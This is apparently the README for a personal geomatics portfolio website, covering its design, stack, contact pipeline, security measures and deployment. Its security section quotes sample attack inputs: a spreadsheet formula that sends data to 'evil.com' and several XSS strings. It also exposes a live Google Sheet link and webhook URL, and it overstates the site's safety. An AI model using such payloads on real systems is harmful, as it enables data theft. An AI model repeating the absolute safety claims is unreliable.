# Prawesh Ojha — Personal Portfolio & Geomatics × AI Engineering Hub
**Live Production Website**: [https://praweshojha.com.np](https://praweshojha.com.np)  
**Primary Domain**: `praweshojha.com.np`  
**Owner**: Prawesh Ojha ([ojhaprawesh@gmail.com](mailto:ojhaprawesh@gmail.com))  
**Repository**: `https://github.com/Praweshojha/domi.git` (Branch: `main`)

---

## 📖 Welcome to Your Website's Master Blueprint

This document is your **complete, beginner-friendly, and permanent manual**. It explains in plain English exactly how your portfolio was built from scratch, what programming languages, libraries, and plugins power it, how every piece of technology functions, where your data goes, how security is handled, and how you can easily update it in the future.

Even if you have zero coding experience, reading this document will give you 100% understanding and ownership of your website.

---

## 📑 Table of Contents
1. [The Big Picture: How Your Website Works](#1-the-big-picture-how-your-website-works)
2. [Visual Identity & Design System ("Terrain Tokens")](#2-visual-identity--design-system-terrain-tokens)
3. [Technology Stack: Languages, Libraries & Plugins Used](#3-technology-stack-languages-libraries--plugins-used)
4. [Every Feature & Section Explained](#4-every-feature--section-explained)
   - [Ambient Looping Drone 3D Model](#the-background-video)
   - [Real 3D Interactive Earth Globe & Instrument Dial](#the-3d-earth-globe--instrument-dial)
   - [Selected Work Plates & Topographic Contours](#selected-work-plates)
   - [Journey & Recognition Engineering Ledger](#journey--recognition-ledger)
   - [Auto-Dismissing Hanging Avatar](#the-hanging-avatar)
   - [Minimal Video Controller](#the-minimal-video-control-button)
5. [The Database & Contact System (Google Drive + Gmail)](#5-the-database--contact-system-google-drive--gmail)
6. [Security & Threat Defense Architecture (Comprehensive 10-Point Defense)](#6-security--threat-defense-architecture)
7. [Complete File & Folder Directory Map](#7-complete-file--folder-directory-map)
8. [How It Is Hosted & Deployed (Cloudflare + GitHub)](#8-how-it-is-hosted--deployed-cloudflare--github)
9. [Step-by-Step Maintenance Guide (How to update it in the future)](#9-step-by-step-maintenance-guide)
10. [Beginner's Glossary of Tech Terms](#10-beginners-glossary-of-tech-terms)

---

## 1. The Big Picture: How Your Website Works

Think of your website like a physical modern engineering office built out of glass and paper laid directly over an aerial drone flight of Banepa, Nepal:

```
┌─────────────────────────────────────────────────────────────────┐
│                      VISITOR'S WEB BROWSER                      │
│            (Desktop PC, Tablet, or Mobile Smartphone)           │
└────────────────────────────────┬────────────────────────────────┘
                                 │
                                 ▼ (HTTPS via Global CDN)
┌─────────────────────────────────────────────────────────────────┐
│                    CLOUDFLARE EDGE NETWORK                      │
│  • Caches HTML, CSS, JS, 3D Models, and Video in 300+ cities    │
│  • Enforces Security Headers (CSP, HSTS, Anti-Sniffing)         │
│  • Runs Serverless Edge Router (/api/contact)                   │
└────────────────────────────────┬────────────────────────────────┘
                                 │
        ┌────────────────────────┴────────────────────────┐
        ▼                                                 ▼
┌──────────────────────────────┐        ┌────────────────────────────────┐
│      STATIC ASSETS LAYER     │        │     GOOGLE CLOUD PIPELINE      │
│  • HTML5 Semantic Skeleton   │        │  • Google Apps Script Webhook  │
│  • CSS3 Terrain Tokens Style │        │  • Google Sheet (Database)     │
│  • Three.js 3D Globe Engine  │        │  • Instant Gmail Notifications │
│  • Background MP4 3D Drone   │        │    to ojhaprawesh@gmail.com    │
└──────────────────────────────┘        └────────────────────────────────┘
```

1. **The Visitor** opens `https://praweshojha.com.np`.
2. **Cloudflare** serves the website in under 50 milliseconds from the nearest server location to the visitor.
3. **The Background Video** (`bg_loop.mp4`) starts playing silently and smoothly in an infinite loop behind everything.
4. **The Three.js Globe** renders an interactive 3D planet Earth oriented to Nepal ($27.62^\circ\text{N}, 85.54^\circ\text{E}$) with coordinate graticules, satellite orbit, and pinpoint marker.
5. **The Contact Form** transmits inquiries directly into your private **Google Sheet on Google Drive** and triggers an alert straight to your **Gmail**.

---

## 2. Visual Identity & Design System ("Terrain Tokens")

Instead of generic purple gradients or blurry glassmorphism, your website is designed around the **Terrain Tokens** design language—inspired by **cartography, surveying sheets, topographic maps, and geomatics instruments**.

### The Exact Color Palette (CSS Variables)
* **Sand (`--sand: #FAF7F0`)**: The warm, premium paper background for all content panels.
* **Sand 2 (`--sand-2: #F0EADB`)**: A slightly darker contour tone used for input fields and table hover states.
* **Ink (`--ink: #14261C`)**: Deep surveyor's ink used for headings and high-contrast wordmarks.
* **Text (`--text: #3F4F44`)**: Crisp, readable dark forest-grey for paragraph body text (exceeds $4.5:1$ contrast ratio for accessibility).
* **Muted (`--muted: #5B6A60`)**: Subdued secondary labels, captions, and dates.
* **Forest Green (`--forest: #166534`)**: The **sole action color** on the website. Primary buttons and active states use this color with pure white text (`#FFFFFF`).
* **Ochre (`--ochre: #D97706` & `--ochre-text: #B45309`)**: Himalayan warm amber used exclusively for markers, coordinate dots, section numbers, and italic underlines.
* **Rules & Lines (`--line: rgba(20, 38, 28, 0.2)`)**: Precise $1\text{px}$ architectural dividers.
* **Contour (`--contour: rgba(22, 101, 52, 0.3)`)**: Topographic contour lines in project illustrations.

### Typography Hierarchy
* **Headings**: `Instrument Serif` (400 weight). The emphasis word is italicized with a $3\text{px}$ ochre underline offset by $6\text{px}$.
* **Body**: `Inter` (400 normal, 500 medium, 600 bold). Clean, highly legible UI typography.
* **Technical Labels & Data**: `JetBrains Mono` (lowercase, e.g., `01 / geomatics · nepal`, `plate 01`).

### The Floating Panel System
All text, cards, and data sit on **sand panels** (`background: rgba(250, 247, 240, 0.95)`) with a crisp $1\text{px}$ line border and a modern $16\text{px}$ border radius. **No heavy black drop shadows, no purple tints, and zero blue**. On hover, interactive cards lift upward slightly (`transform: translateY(-3px)`).

---

## 3. Technology Stack: Languages, Libraries & Plugins Used

Here is the exact technical inventory of every programming language, library, runtime, and plugin used to construct your website.

### 1. Programming Languages

| Language | Version / Standard | Where It Is Used | Purpose |
| :--- | :--- | :--- | :--- |
| **HTML5** | Modern HTML Living Standard | `frontend/public/index.html` | Provides the semantic skeleton, document layout, accessible landmarks (`<header>`, `<main>`, `<section>`, `<nav>`, `<footer>`), native video container, and WebGL canvas mounting point. |
| **CSS3** | Modern CSS (Grid / Flexbox / Variables) | `frontend/public/css/style.css` | Handles 100% of the visual styling, typography, responsive breakpoints (`@media`), and GPU-accelerated keyframe animations (`swingCord`, `retractUp`, `spinBezel`, `pulseRadar`). |
| **JavaScript** | ECMAScript 2022 (ES6+) | `frontend/public/js/app.js`, `earth_globe.js` | Powers client-side interactivity, avatar auto-dismiss timer, video toggle button, clipboard copying, form sanitization, and WebGL 3D math. |
| **Node.js / V8** | Node.js v18+ Runtime | `worker.js`, `functions/api/contact.js`, `backend/` | Powers the Cloudflare Workers serverless edge execution and the optional local Express development server. |
| **Google Apps Script** | Google Cloud JavaScript Runtime | Google Cloud Webhook (`AKfycbzE...`) | Runs serverless JavaScript in your Google account to receive form submissions, append rows to Google Sheets, and dispatch emails via Gmail. |

---

### 2. Libraries & Plugins

| Library / Tool | Version / Source | Why It Was Chosen |
| :--- | :--- | :--- |
| **Three.js** (`three.min.js`) | `r128` (WebGL Engine) | **The 3D Graphics Core**: Renders the interactive 3D Earth globe directly in the browser using the visitor's graphics hardware (GPU). Generates the sphere geometry, NASA Blue Marble textures, independent cloud layer, polar orbit path, and coordinate graticules without plugins. |
| **Cobe** (`cobe.js`) | `v0.6.3` (WebGL Spring Globe) | Included as a lightweight 5KB WebGL globe library option/fallback for minimal devices. |
| **Google Fonts API** | Web Font Service | Delivers the typography (`Instrument Serif`, `Inter`, `JetBrains Mono`) directly from Google's global font edge cache without requiring manual font file licensing or hosting overhead. |
| **Cloudflare Workers** | Serverless Edge Runtime | Executes your `/api/contact` edge router right at Cloudflare's nearest data center (under 10ms latency worldwide), eliminating the cost and maintenance of running a 24/7 dedicated server. |
| **Wrangler CLI** | Cloudflare Developer Suite | Used to configure, test, and deploy edge routing and static assets via `wrangler.toml`. |
| **Express.js** (`package.json`) | `v4.19+` (Node.js) | Minimal web framework located in `backend/` for running a standalone local test server on your computer if desired. |
| **Helmet** | `v7.1+` (Node.js) | Automated security middleware in `backend/` that attaches protective HTTP headers. |
| **CORS** | `v2.8+` (Node.js) | Whitelists only trusted origins to prevent unauthorized cross-origin requests. |
| **Express-Rate-Limit** | `v7.2+` (Node.js) | Prevents denial-of-service (DoS) and rapid-fire spam attempts during local backend testing. |

---

### 3. The "Framework-Free" Engineering Philosophy (Why No React or Tailwind?)

A conscious, high-level engineering decision was made **not** to use heavy JavaScript frameworks (like React, Angular, or Vue) or massive CSS frameworks (like Bootstrap or Tailwind).

* **Near-Instant Load Times**: Without 500 KB of framework JavaScript to download and parse, your website renders in under **50 milliseconds**.
* **Zero Dependency Breakage**: Framework-based websites frequently break after 1–2 years when npm packages become obsolete. Pure HTML, CSS, and vanilla JavaScript adhere to web standards that remain backwards-compatible for decades.
* **Maximum Battery & CPU Efficiency**: The site runs lightweight native code with zero virtual-DOM overhead, ensuring smooth 60fps animations even on mobile devices.

---

## 4. Every Feature & Section Explained

### The Background Video
* **File Location**: `frontend/public/video/bg_loop.mp4`
* **What it is**: High-definition continuous drone footage of a 3D textured photogrammetric model of Banepa, Nepal.
* **How it works**:
  * Set to `position: fixed`, spanning $100\text{vw} \times 100\text{vh}$ with `z-index: -10`.
  * Configured with `autoplay muted loop playsinline`.
  * **No scrim or dark overlay**: The raw drone motion remains clearly visible through the gaps between the floating sand panels.

### The 3D Earth Globe & Instrument Dial
* **Code Location**: `frontend/public/js/earth_globe.js` and `#globe-container` in `index.html`
* **Technology**: Built with **Three.js** (WebGL 3D graphics).
* **Components**:
  1. **Dial Bezel Ring**: A circular SVG frame with 72 symmetric graduation ticks and a North arrow that rotates very slowly ($90\text{s}$ full turn).
  2. **Crosshair Lines**: $0.8\text{px}$ thin ochre horizontal and vertical lines crossing through the dial center.
  3. **Real Earth Sphere**: Textured with NASA Blue Marble global surface imagery.
  4. **Atmospheric Cloud Layer**: A semi-transparent outer cloud sphere rotating independently at $0.0002\text{ rad/frame}$.
  5. **Geographic Coordinate Graticules**: Latitudinal parallels (every $15^\circ$) and longitudinal meridians (every $30^\circ$) rendered in contour green, with the Equator highlighted in ochre.
  6. **Nepal Pinpoint Marker**: Fixed accurately at Banepa / Dhulikhel ($27.6195^\circ\text{N}, 85.5385^\circ\text{E}$) with an ochre stalk, beacon point, pulsing ground radar ring, and a `▲ banepa` label.
  7. **Sentinel-2 Satellite**: An orbiting earth-observation satellite model with forest-green solar wings traveling on a dashed polar orbit path.
  8. **Drag & Touch Interactivity**: Visitors can click and drag (or swipe on touchscreens) to rotate the planet in any direction. When released, it resumes gentle auto-rotation after 3 seconds.

### The 4-Cell Domain Strip
Directly beneath the hero section sits a ruled 4-cell paper strip highlighting your four core engineering pillars:
* **01 GIS**: Spatial analysis
* **02 AI/ML**: Applied innovation
* **03 RS**: Earth observation
* **04 GNSS**: Positioning & surveying

### Selected Work Plates
* **Plates 01–03**: Project cards styled as archival cartographic "plates":
  * **Crop Marks**: Four $10\text{px}$ L-shaped technical crop marks on the corners.
  * **Contour SVGs**: Custom vector illustrations depicting topographic elevation contour lines, emergency routing vectors, surveying coordinate grids, and algorithmic matrices.
  * **Rubber Stamp Badges**: Angled technical status stamps rotated $-4^\circ$ (`in development`, `complete`).
  * **Tech Tags**: Outlined rectangular tags with $6\text{px}$ border radius.

### Journey & Recognition Ledger
* Instead of floating floating bubbles, your awards and education are presented as an **engineering title-block table**:
  * Date in mono (`2026 · record 01`).
  * Award or role title in Instrument Serif.
  * Description in Inter.
  * Status badge on the right (`1st prize`, `achievement`, `coordinator`, `geomatics eng.`).

### What I'm Exploring
* A focused research ledger listing future technical directions (Geospatial AI, Disaster risk & resilience in mountain regions, Earth observation, and WebGIS decision tools).

### The Hanging Avatar
* **File Location**: `frontend/public/img/prawesh_avatar.jpg`
* **What it is**: A portrait of Prawesh hanging from an authentic surveyor's flagging cord in the top-right corner.
* **Auto-Dismiss Behavior**:
  * On page load, it swings into view with a gentle physical pendulum animation.
  * At **5 seconds**, it smoothly pulls back up into the ceiling margin (`@keyframes retractUp`: `top: 0px → -380px` and `opacity: 1 → 0` over $0.9\text{s}$) and completely vacates layout space.
  * Can also be dismissed instantly at any time by clicking or pressing Enter/Space/Escape.

### The Minimal Video Control Button
* Located in the bottom-right corner ($40\text{px} \times 40\text{px}$ sand button, $10\text{px}$ radius).
* Allows visitors to pause or resume background drone video motion at any time with a single tap.

---

## 5. The Database & Contact System (Google Drive + Gmail)

Your contact system uses a modern, **serverless, zero-maintenance architecture** that connects your website directly to your personal **Google Drive** and **Gmail** without needing a dedicated SQL server.

### The Workflow Diagram
```
Visitor enters Name, Email, Message on Website
                     │
                     ▼
       Browser Sanitization (app.js)
  (Strips control chars, neutralizes formulas, checks honeypot)
                     │
                     ▼
  Cloudflare Edge Router (functions/api/contact.js)
  (Validates origin, payload size cap < 50KB, lengths)
                     │
                     ▼
   Google Apps Script Webhook (AKfycbzEgoNYmtR96Qyk...)
                     │
        ┌────────────┴────────────┐
        ▼                         ▼
Google Sheet on Drive        Instant Gmail Alert
  Appends new row:           Delivers notification to:
  [Timestamp | Name |        ojhaprawesh@gmail.com
   Email | Message]          with direct reply link!
```

### Links to Your Live Data:
* **Your Google Sheet**: [Portfolio Inquiries](https://docs.google.com/spreadsheets/d/1ApYHAe-522vBpwpPvGsujFgm5kDL13_SFDYfwyKV-r4/edit?gid=0#gid=0)
* **Your Google Apps Script Webhook**: `https://script.google.com/macros/s/AKfycbzEgoNYmtR96Qyk-x7lxRj-jAVHS8x9-t8bIT2iJnKl1AKxaFEeSlUEUhIDutwprs7J/exec`

### One-Click Email Copy
Next to the "email me ↗" button in Section 06 sits a dedicated **"copy email"** button. Clicking it uses `navigator.clipboard` to copy `ojhaprawesh@gmail.com` to the visitor's clipboard and displays a visual `"copied to clipboard! ✓"` toast for 2.5 seconds.

---

## 6. Security & Threat Defense Architecture

Your portfolio features a comprehensive, multi-tiered defensive security architecture. Below is an exhaustive breakdown of how each threat is defended against:

### 1. Spreadsheet Formula Injection Defense (CWE-1236 / CSV Injection)
* **The Threat**: If a malicious visitor inputs a message starting with spreadsheet command formulas like `=IMPORTXML("http://evil.com/leak", "//a")`, `=HYPERLINK(...)`, or `=CMD(...)`, spreadsheet software could attempt to execute external web requests or commands when you open Google Sheets.
* **The Defense**: Our custom sanitizers in both `app.js` and `contact.js` inspect every single line of incoming input. If any line begins with `=`, `+`, `-`, `@`, `\t`, or `\r`, an apostrophe prefix (`'`) is automatically prepended. Google Sheets is forced to treat the cell contents strictly as inert, static plain text.

### 2. Invisible Anti-Bot Honeypot Trap
* **The Threat**: Automated web scrapers and malicious spam bots continuously scan the internet to blast forms with spam or phishing payloads.
* **The Defense**: An off-screen input `<input id="contact-website" name="website" autocomplete="off" tabindex="-1">` is positioned outside the viewport. Real human visitors never see it, focus on it, or type in it. Automated spam bots automatically fill every field they find. If this field contains any data, both client-side JavaScript and Cloudflare Workers drop the submission instantly without processing it.

### 3. Client & Edge Rate Limiting (Anti-Spam & DoS Protection)
* **Client-Side Cooldown**: When a visitor submits a message, a timestamp is saved to their browser's `sessionStorage`. Subsequent submissions are locked for **45 seconds**, providing clear UI feedback.
* **Edge Payload Capping**: The Cloudflare Worker enforces a strict **50 KB payload size limit** and string length caps (Name: 100 chars, Email: 120 chars, Message: 3,000 chars). Excessively large payloads designed to exhaust memory are rejected before reaching any backend.

### 4. Cross-Site Scripting (XSS - CWE-79) Defense
* **The Threat**: Attackers injecting `<script>alert('hacked')</script>` or `<img src=x onerror=...>` into forms to hijack user sessions.
* **The Defense**: All dynamic user-facing DOM manipulation strictly utilizes native `.textContent` rather than `.innerHTML`. Untrusted input is never evaluated or executed as HTML code.

### 5. Malicious Links & Web Isolation (Why Your Computer, Contacts & Bank Accounts Are 100% Safe)
* **The User's Natural Concern**: *"If somebody pastes a malicious link or virus URL in the inquiry box, can they hack my personal computer, steal my contacts, or compromise my bank account?"*
* **The Technical Guarantee**: **No, they cannot.** Here is why:
  1. **No Automatic Web Crawling**: The website and Cloudflare Workers never fetch, crawl, or open URLs sent in the form. This eliminates Server-Side Request Forgery (SSRF).
  2. **Inert Storage**: Google Sheets stores the submission as simple alphanumeric text characters inside a cloud cell. It does not download any files to your desktop.
  3. **Air-Gapped Isolation**: Your personal laptop, home Wi-Fi, bank accounts, and browser passwords are completely decoupled from Cloudflare and Google Cloud. There is zero physical or digital bridge for an incoming web form string to access your device.

### 6. Content Security Policy (CSP) & HTTP Security Headers
Configured directly in `frontend/public/_headers` and deployed across Cloudflare's global edge network:
* **`Content-Security-Policy`**: Restricts script execution, styles, media, and network connections exclusively to trusted origins (`'self'`, Google Fonts, cdnjs, Cloudflare).
* **`Strict-Transport-Security` (HSTS)**: `max-age=31536000; includeSubDomains; preload` forces all browsers to communicate exclusively over encrypted HTTPS.
* **`X-Frame-Options: DENY`**: Protects against clickjacking by preventing any third-party website from embedding your portfolio inside an `<iframe>`.
* **`X-Content-Type-Options: nosniff`**: Prevents browsers from MIME-sniffing file types and executing malicious files disguised as images.
* **`Referrer-Policy: strict-origin-when-cross-origin`**: Prevents sensitive URL path information from leaking to external websites.

### 7. Cross-Origin Resource Sharing (CORS) Isolation
* The API endpoint strictly validates incoming `Origin` headers, allowing only authorized requests originating from `https://praweshojha.com.np`. Unauthorized foreign domains are blocked.

### 8. Zero-Vulnerability Dependency Hygiene
* The project dependencies in `backend/` have been audited with `npm audit`. Zero known vulnerabilities exist. The public frontend is 100% dependency-free, running standard native browser APIs.

---

## 7. Complete File & Folder Directory Map

Here is the exact layout of your repository:

```
domain_profile/
├── .gitignore                    # Tells Git which temporary files to ignore
├── README.md                     # THIS FILE — Your master manual
├── wrangler.toml                 # Cloudflare Workers/Pages configuration
├── worker.js                     # Cloudflare Edge Worker request router
│
├── frontend/
│   └── public/                   # The public assets served to visitors
│       ├── _headers              # HTTP Security Headers (CSP, HSTS, X-Frame)
│       ├── index.html            # Main website HTML structure
│       ├── css/
│       │   └── style.css         # Complete Terrain Tokens stylesheet & animations
│       ├── js/
│       │   ├── app.js            # Interactivity, form logic, avatar timer, nav toggle
│       │   ├── earth_globe.js    # Three.js 3D Earth, satellites, pins, rotation
│       │   ├── three.min.js      # Three.js library (r128)
│       │   └── cobe.js           # Lightweight WebGL fallback library
│       ├── img/
│       │   ├── earth_atmos_2048.jpg  # NASA high-res Blue Marble texture
│       │   ├── earth_clouds_1024.png # Realistic transparent cloud overlay
│       │   ├── hero_globe.jpg        # Fallback static image for no-JS browsers
│       │   ├── prawesh_avatar.jpg    # Your hanging avatar photo
│       │   └── waving_avatar.jpg     # Alternate avatar image
│       └── video/
│           └── bg_loop.mp4       # The looping Banepa 3D drone model video
│
├── functions/
│   └── api/
│       └── contact.js            # Cloudflare Serverless Function for /api/contact
│
└── backend/                      # Optional standalone Express.js local server
    ├── package.json              # Backend dependencies
    ├── server.js                 # Local Express server with rate-limiting & helmet
    └── routes/
        └── contactRoutes.js      # Local Express contact route handlers
```

---

## 8. How It Is Hosted & Deployed (Cloudflare + GitHub)

Your website uses a modern **GitOps automated deployment pipeline**:

1. **GitHub Repository**: All your website code lives safely on your GitHub account at `https://github.com/Praweshojha/domi`.
2. **Cloudflare Integration**: Cloudflare is connected directly to your GitHub repository.
3. **Automatic Continuous Deployment (CI/CD)**:
   * Whenever you push code to GitHub (`git push origin main`), Cloudflare automatically detects the new commit.
   * Cloudflare compiles the assets, runs edge routing, and distributes the updated website across its global network of 300+ data centers in approximately **15 seconds**.
   * You never have to manually upload files via FTP or cPanel.

---

## 9. Step-by-Step Maintenance Guide

Whenever you want to update your portfolio in the future, follow these easy steps:

### How to Test Locally on Your Desktop
1. Open PowerShell and navigate to your folder:
   ```powershell
   cd "C:\Users\prawesh ojha\OneDrive\Desktop\domain_profile"
   ```
2. You can preview the website by running a simple local server:
   ```powershell
   npx serve frontend/public
   ```
   Open `http://localhost:3000` in your browser.

---

### Common Updates & Where to Make Them

#### 1. Editing Your Bio or Introduction Text
* Open [`frontend/public/index.html`](file:///frontend/public/index.html).
* Search for: `Mapping the world` or `hero-lead`.
* Edit the text directly inside the `<p>` or `<h1>` tags.

#### 2. Adding or Editing a Project in "Selected Work"
* Open [`frontend/public/index.html`](file:///frontend/public/index.html).
* Search for: `plate-card`.
* Each project is enclosed inside an `<article class="plate-card paper-panel">` block.
* You can update the title, link, rubber stamp badge (`complete` / `in development`), description, or tech tags.

#### 3. Updating an Award in the "Journey" Ledger
* Open [`frontend/public/index.html`](file:///frontend/public/index.html).
* Search for: `journey-table`.
* Each row is structured as:
  ```html
  <div class="journey-row">
    <div class="journey-cell-date mono">2026 · record 01</div>
    <div class="journey-cell-main">
      <h3 class="journey-title">AI/ML Competition</h3>
      <p class="journey-desc">Awarded first prize for developing an innovative modelling solution...</p>
    </div>
    <div class="journey-cell-badge mono">
      <span class="rubber-stamp">1st prize</span>
    </div>
  </div>
  ```

#### 4. Updating Social Media Links
* In [`frontend/public/index.html`](file:///frontend/public/index.html), search for `social-links-container` (Section 06) or `survey-footer` (Footer) to update LinkedIn, GitHub, Facebook, or Instagram URLs.

---

### How to Publish Your Changes to the Live Website
Once you have saved your edits in VS Code or any text editor:

1. Open PowerShell in your project folder:
   ```powershell
   cd "C:\Users\prawesh ojha\OneDrive\Desktop\domain_profile"
   ```
2. Stage all your changed files:
   ```powershell
   git add .
   ```
3. Commit your changes with a brief note describing what you changed:
   ```powershell
   git commit -m "Update project descriptions and bio"
   ```
4. Push your commit to GitHub:
   ```powershell
   git push origin main
   ```
5. **Done!** Cloudflare will automatically build and publish your changes to [https://praweshojha.com.np](https://praweshojha.com.np) in about 15 seconds.

---

## 10. Beginner's Glossary of Tech Terms

* **HTML (HyperText Markup Language)**: The skeleton of your website (`index.html`). It defines text, headings, buttons, and sections.
* **CSS (Cascading Style Sheets)**: The designer and stylist (`style.css`). It controls colors, fonts, spacing, rounded corners, and animations.
* **JavaScript (JS)**: The brain (`app.js`). It handles logic, like what happens when a button is clicked, starting the 5-second avatar timer, and submitting forms.
* **Three.js**: A high-performance 3D graphics engine that renders the real 3D Earth globe using your computer's GPU via WebGL.
* **Cloudflare**: A global cloud platform that protects your domain from attacks, provides free SSL certificates (`https://`), and serves your website at lightning speed worldwide.
* **Git & GitHub**: Git tracks the history of changes made to your files. GitHub is the cloud backup that hosts your repository.
* **Google Apps Script**: A lightweight JavaScript engine inside your Google account that allows your Google Sheet to receive web requests and send automated emails via Gmail.
* **Honeypot**: An invisible form field used as a trap to catch automated spam bots without requiring annoying CAPTCHAs.
* **CSP (Content Security Policy)**: A set of strict security rules sent to web browsers that prevent malicious code or unauthorized external scripts from running on your website.

---

*Authored for Prawesh Ojha · Maintained with pride on GitHub & Cloudflare.*
